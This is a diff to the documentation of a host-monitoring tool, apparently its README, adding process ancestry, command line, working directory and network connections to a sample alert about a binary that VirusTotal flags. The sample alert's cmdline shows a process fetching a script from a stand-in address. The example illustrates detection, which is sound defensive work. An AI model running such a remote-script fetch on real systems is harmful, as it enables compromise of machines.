@@ -1249,15 +1249,29 @@ outage, an unparseable response, a hash VT has never seen — every one of
 those sends the alert anyway. A monitoring system must not go quiet
 because a third-party API had a bad day.
 
-Each alert carries its own verdict:
+Each alert carries its own verdict, and enough context to judge it
+without logging in to the host:
 
 ```
   suspicion : 1.00
+  when      : 2026-08-17 01:25:01 UTC
   exe       : /usr/local/bin/updater
   sha256    : 7947969…
   why       : exec from world-writable path
   vt        : VirusTotal: 41/62 engines flag this
+  uid       : 1000
+  cmdline   : /usr/local/bin/updater --fetch http://198.51.100.7/x.sh
+  cwd       : /tmp
+  ancestry  : systemd[1] → sshd[812] → bash[4410] → updater[4457]
+  connections: 10.0.0.5:44120 -> 198.51.100.7:80
 ```
+
+The ancestry is usually what decides it: the same binary run by a human
+over SSH and run by a web server mean very different things. Open files
+and connections are a **snapshot** — a short-lived process is gone
+before they can be read, and in that case the alert says so rather than
+showing an empty list, because "opened nothing" and "already exited" are
+not the same fact.
 
 A flagged binary **leads its host's list and the subject line**
 (`[1 VT-FLAGGED]`), so the worst thing is visible without scrolling.
